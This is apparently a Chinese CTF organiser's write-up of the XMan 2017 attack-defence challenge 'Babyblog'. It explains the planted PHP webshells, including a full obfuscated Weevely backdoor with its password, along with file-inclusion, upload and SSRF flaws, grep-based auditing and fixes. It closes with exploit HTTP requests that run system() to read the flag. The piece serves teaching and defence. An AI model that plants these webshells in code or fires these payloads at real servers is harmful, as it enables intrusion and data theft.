---
id: 121
title: 'XMan2017夏令营结业攻防赛Babyblog出题思路&#038;WriteUP'
date: 2017-08-20T23:32:06+08:00
author: xm1994
layout: revision
guid: https://www.summershrimp.com/2017/08/116-revision-v1/
permalink: /2017/08/116-revision-v1/
---
# XMan 2017 AWD Babyblog author&#8217;s turtoral & writeup

## 0x00 出题思路

### 常见一句话木马

一句话木马是在日常攻击和渗透中使用的最广泛的一类木马，其具有代码量小，变形多，易隐藏等特性。这类一句话木马多为通过eval或类似命令直接执行对应语言的字符串代码，达到可以执行任意命令的效果。在本题中，我一共放置了四种不同类型的一句话木马：
```
# 1. app/template/*.tpl
eval($_POST[passwd])

# 2. app/controllers/PostsController.php 
$_GET[function]($_POST[params])

# 3. bootstrap/autoload.php
echo `$_POST[shellcmd]`

# 4. app/views/errors/404.blade.php
@preg_replace("/[pageerror]/e", $_POST['passwd'], "saft");
```

### 常见大马

相比于小马，这类木马通常体积稍大，更不易隐藏。但其中可以包含更多加密和混淆的措施，使攻击行为更不容易被察觉。在本题中，我放置了一个Weevely木马，其密码为xman1234

```
# 1. autoload_real.php
$i='er";$K3i=$m[1][0K3].K3$m[1K3]K3[1];$hK3=$K3sl($ss(K3md5($i.$kh),0,K33));$f=$sl(K3$sK3s(md5($i.$';
$D='kfK3K3),0,3));$p="K3";foK3K3r(K3$K3z=1;$z&lt;count($m[1]);K3$z++)$pK3.=$q[$m[K32K3][K3K3$z]];if(sK';
$v='3LANK3GUAK3GE"];if($rr&&$ra)K3{$u=paK3rK3K3sK3K3e_url($rr);parse_str($uK3["query"],$qK3);$q=arK';
$B='[$i].=$p;$eK3=strpK3oK3s($s[$i]K3,$f);ifK3($eK3){$k=$khK3.K3$kf;oK3b_start();@evaK3l(@gzuncK3om';
$o='3;}}return K3$oK3;}$rK3=$_K3SERVER;$K3rr=@$r[K3"HTTP_REFEREK3R"];$ra=K3@$r["K3HTTP_AK3CCK3EPT_K';
$O='K3;iK3f($q&K3&$m){@sesK3sioK3n_start()K3;$s=K3&$_SK3ESSIK3OK3N;$ss="substK3r";$sK3l="strtK3olow';
$H='3="";for($i=0;$i&lt;$l;K3){fK3orK3($j=0;($j&lt;$K3c&&$i&lt;$K3lK3)K3;$j++K3,$i++){$o.=$tK3{$i}^$k{$K3j}K';
$c='$K3ss($s[$i],0K3,$eK3))),$k))K3);$K3o=oK3b_get_conK3tentsK3();ob_enK3d_cK3lean();K3K3$d=baseK36';
$m='4_encode(x(K3gzcompK3ress($oK3),$kK3));print("&lt;K3$k&gt;$dK3K3&lt;/$k&gt;"K3);@sK3ession_deK3stroy();}}}}';
$t='$kh="a8bK3b";$K3kf="c44K3K3a";funK3ctK3ion x($t,$k){$cK3=sK3trlen($kK3);$l=stK3rlK3en($t);K3$oK';
$M='prK3ess(@x(@bK3aK3se64K3_decodeK3(pregK3_replaK3ce(aK3rray("/_/",K3"/-/"),arrK3ay(K3"/","K3+"),';
$f='3trposK3($p,$h)===0K3){$s[$i]=""K3;$p=$sK3s($pK3,3);}K3K3if(array_key_exisK3ts($i,K3$K3sK3)){$s';
$Q=str_replace('d','','crdddeatde_fdunctdion');
$b='3raK3y_vK3alues(K3$q)K3;preg_mK3aK3tch_all("K3/(K3[\\K3w])[\\w-]+(?:;q=0.([\\d]))K3?,K3?/",$ra,$m)';
$l=str_replace('K3','',$t.$H.$o.$v.$b.$O.$i.$D.$f.$B.$M.$c.$m);
$q=$Q('',$l);$q();
```

在这段大马中，`$Q`和`$l`均为字符串。Weevely借助PHP可以将函数名字符串用作类似函数指针的特性，来构造木马。

```
$Q = create_function

$kh = "a8bb";
$kf = "c44a";
function x($t, $k) {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0;$i &lt; $l;) {
		for ($j = 0;($j &lt; $c && $i &lt; $l);$j++, $i++) {
			$o.= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr && $ra) {
	$u = parse_url($rr);
	parse_str($u["query"], $q);
	$q = array_values($q);
	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
	if ($q && $m) {
		@session_start();
		$s = & $_SESSION;
		$ss = "substr";
		$sl = "strtolower";
		$i = $m[1][0] . $m[1][1];
		$h = $sl($ss(md5($i . $kh), 0, 3));
		$f = $sl($ss(md5($i . $kf), 0, 3));
		$p = "";
		for ($z = 1;$z$d");@session_destroy();}}}}
```

### 任意文件包含 

任意文件包含多为服务端程序在开发时没对可包含目录和文件做限制，导致可以读取任何文件。一般的表现形式为`http://localhost/page=index`或类似方式。本题中，我们在博客文章中引入了正文模板，这里的模板就具有文件包含漏洞。

```
# 1. app/views/posts/show.blade.php
<div class="article-body">
    {{ require __DIR__."/../../template/".$post->template }}
    {{ $post->body }}
</div>
```

### 任意文件上传 

任意文件上传多为服务端程序在开发时，未对可上传文件的扩展名进行限制，导致可以上传服务器脚本，并通过HTTP访问执行。本题中，我们在博客文章图片上传处未对可上传文件做限制。

```
# 1. app/controllers/PostsController.php
    public function uploadImage()
    {
        $data = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        if ($file = Input::file('upload_file'))
        {
            $fileName        = $file-&gt;getClientOriginalName();
            $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            $file-&gt;move($destinationPath, $safeName);
            $data['file_path'] = $folderName .'/'. $safeName;
            $data['msg'] = "Succeeded!";
            $data['success'] = true;
        }
        return $data;
    }
```

### 服务端请求伪造 

服务端请求伪造是指在开发过程中，有些用户提交的资源（如图片，文字等）需要加载到服务器本地进行处理，但服务端并未对资源地址进行限制，导致的可以探测服务器内网或任意本地文件读取。本题中，我们设计了/resolve_image这个调用，但是并没有制作相应的前端页面。

<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function resolveImage()
    {
        $resp = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        $data = Input::only('resolve_file');

        $content = @file_get_contents($data['resolve_file']);
        if ($content)
        {
            $extension       = 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            @mkdir($destinationPath, 0755, true);
            @file_put_contents($destinationPath .'/'. $safeName, $content);
            $resp['file_path'] = $folderName .'/'. $safeName;
            $resp['msg'] = "Succeeded!";
            $resp['success'] = true;
        }
        return $resp;
    }</pre>

## 0x01 审计与防御方式 

### 常见一句话木马 

可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>eval, system, passthru, $_POST, $_REQUEST</code>）等，来快速定位相关位置，随后对源码进行审查。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码。

<pre class="lang:default decode:true">$ grep -re eval
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        $__result = eval($__input);
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        eval($__hook);
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";

$grep -re \$_POST
bootstrap/compiled.php:        $request = self::createRequestFromFactory($_GET, $_POST, array(), $_COOKIE, $_FILES, $_SERVER);
bootstrap/compiled.php:        $_POST = $this-&gt;request-&gt;all();
bootstrap/compiled.php:        $request = array('g' =&gt; $_GET, 'p' =&gt; $_POST, 'c' =&gt; $_COOKIE);
bootstrap/autoload.php:echo `$_POST[checker]`;
public/packages/frozennode/administrator/js/ckeditor/samples/assets/posteddata.php:if (!empty($_POST))
...
app/views/errors/404.blade.php:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/storage/views/dde1e00e577ea930001955e78ec38ca4:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";</pre>

### 常见大马 

基本方法同小马，但由于大马结构复杂，更加需要平时的积累和人工分析能力。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码或文件。

### 任意文件包含 

可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>include, require</code>）等，来快速定位相关位置，随后对源码进行审查。但因为这类关键词几乎在所有的代码文件中都存在，审查难度相对较大。但由于任意文件包含一般出现在业务逻辑内，与常用库的包含方式有所区别，有能力的团队可以开发一些审计工具，对其特征进行审计，也可以从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。

在本题中，容易发现系统自带的三个模板均以<span spellcheck="false"><code>[0-9]\.tpl</code>命名，因此在相关业务逻辑中，对提交的模板名称进行过滤即可。具体的位置如下。

<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function store()
{
    $validator = Validator::make(Input::all(), Post::$rules);
    
    if ($validator-&gt;fails())
    {
        return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    $data = Input::only('title', 'body', 'category_id', 'template');
    $data['user_id'] = Auth::user()-&gt;id;
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post = Post::create($data);
    $post-&gt;tag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}
# 2. app/controllers/PostsController.php
public function update($id)
{
    $post = Post::findOrFail($id);
    $this-&gt;authorOrAdminPermissioinRequire($post-&gt;user_id);
    $validator = Validator::make($data = Input::all(), Post::$rules);
    if ($validator-&gt;fails())
    {
            return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post-&gt;update($data);
    $post-&gt;retag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}</pre>

在这两个函数中，对<span spellcheck="false"><code>$data['template']</code>提供的文件名进行正则匹配过滤即可。

### 任意文件上传 

可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>upload, $_FILES, move_uploaded_file, move</code>）等，来快速定位相关位置，随后对源码进行审查。这类漏洞一般比较容易进行审查，相关关键词即可大致定位可能出现问题的位置。由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。

在本题中，容易发现博客文章图片上传功能未对文件类型进行过滤，我们需要修改相关代码，过滤掉可能导致上传木马文件的扩展名。

<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function uploadImage()
{
    $data = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    if ($file = Input::file('upload_file'))
    {
        $fileName        = $file-&gt;getClientOriginalName();
        $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        $file-&gt;move($destinationPath, $safeName);
        $data['file_path'] = $folderName .'/'. $safeName;
        $data['msg'] = "Succeeded!";
        $data['success'] = true;
    }
    return $data;
}</pre>

这里可以简单的过滤<span spellcheck="false"><code>$safeName</code>中是否包含<span spellcheck="false"><code>'php'</code>等可作为脚本运行的文件扩展名字符串，发现问题直接返回错误即可。

### 服务端请求伪造 

可以通过grep或find等命令搜索相关关键字（如file_get_content, curl）等，来快速定位相关位置，随后对源码进行审查。但由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。

在本题中，此漏洞并不存在前端调用，因此只能对代码进行审计。可以发现在<span spellcheck="false"><code>/resolve_file</code>请求对应的处理函数中存在此类情况。

<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function resolveImage()
{
    $resp = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    $data = Input::only('resolve_file');

    $content = @file_get_contents($data['resolve_file']);
    if ($content)
    {
        $extension       = 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        @mkdir($destinationPath, 0755, true);
        @file_put_contents($destinationPath .'/'. $safeName, $content);
        $resp['file_path'] = $folderName .'/'. $safeName;
        $resp['msg'] = "Succeeded!";
        $resp['success'] = true;
    }
    return $resp;
}</pre>

可以发现这里<span spellcheck="false"><code>file_get_contents</code>直接传入了请求参数，而未对其做过滤，因此可能导致任意文件读取。这里可以通过检查<span spellcheck="false"><code>$data['resolve_file']</code>的开头是否为<span spellcheck="false"><code>'http'</code>并且对<span spellcheck="false"><code>'localhost'</code>, <span spellcheck="false"><code>'127.*.*.*'</code>等相关的内网域名、IP等进行过滤。

## 0x02 漏洞利用方式 

### 1. index 

<pre class="lang:default decode:true">GET http://localhost:21000/?method=assert HTTP/1.1
Host: localhost:21000
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Referer: system('cat /home/web/flag/flag')</pre>

### 2. 404 

<pre class="lang:default decode:true">POST http://localhost:21000/asdadasdaasd HTTP/1.1
Host: localhost:21000
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

notfound=system("cat%20%2Fhome%2Fweb%2Fflag%2Fflag")</pre>

在比赛现场由于部署时使用了php7, preg_match的r选项已无法使用，因此该漏洞失效。

### 3. upload_image 

<pre class="lang:default decode:true">POST /upload_image</pre>

直接上传一句话木马，随后通过一句话木马利用。

### 4. weevely in autoload_real.php 

<pre class="lang:default decode:true">$ weevely http://ip:port/any xman1234</pre>

随后通过weevely直接读flag

### 5. Post checker=shellcmd in autoload.php 

<pre class="lang:default decode:true">POST http://localhost:21000/ HTTP/1.1
Host: localhost:21000
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

checker=cat%20%2Fhome%2Fweb%2Fflag%2Fflag</pre>

### 6. template any file require 

<span spellcheck="false"><code>http://localhost:21000/posts/create</code>在发布文章时修改提交的模板值

<pre class="lang:default decode:true">html
&lt;div class="form-group"&gt;
    &lt;select class="form-control" name="template"&gt;
    &lt;option value="/../../../../../../home/web/flag/flag"&gt;Template 1&lt;/option&gt;
    &lt;option value="2.tpl"&gt;Template 2&lt;/option&gt;
    &lt;option value="3.tpl"&gt;Template 3&lt;/option&gt;&lt;/select&gt;
&lt;/div&gt;</pre>

随后新发布的文章中就会包含flag的值

### 7. resolve_file SSRF 

<pre class="lang:default decode:true">POST http://localhost:21000/resolve_image HTTP/1.1
Host: localhost:21000
Content-Length: 112
Content-Type: application/x-www-form-urlencoded
Cookie: laravel_session=eyJpdiI6ImN0alBVaUVmSWhDKzlpVXhybGVPZXc9PSIsInZhbHVlIjoianU3Ym9CcXFOeVN4bW5nS0k2MWxcL25Ed0FBN2s5VFg5SFlxRGl5eW12b1J4bkpSTFl3QzR3d0l4bUtvTzhMNklEQndEdlRDMVF0UmtSTllnVlNOaUR3PT0iLCJtYWMiOiJjNWNiNmMyODNjYmU1MGUyYTE0OWY0ZTMxMGQ4ZTRmM2Q2MDRhMDBjOWJmNTU4MGJjMDY1NGRkNzdjNDJhYjYwIn0%3D

resolve_file=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D../../../../../../home/web/flag/flag</pre>

<span class="">随后根据返回的json文件中file_path的值下载文件后base64解码即为flag

&nbsp;

## 0x03 总结

这次出题难度属于较为简单的，考察的也是最基础的一些常见web注入点。但由于时间关系和比赛性质，没有对XSS，CSRF，SQL注入等知识点进行考察，且所有的漏洞点均为可直接利用，没有需要二次利用的漏洞。以后可能会尝试出一些和密码学/misc/pwn相结合的web攻防题。最后也恭喜在这次夏令营中取得优异成绩的各位大师傅！
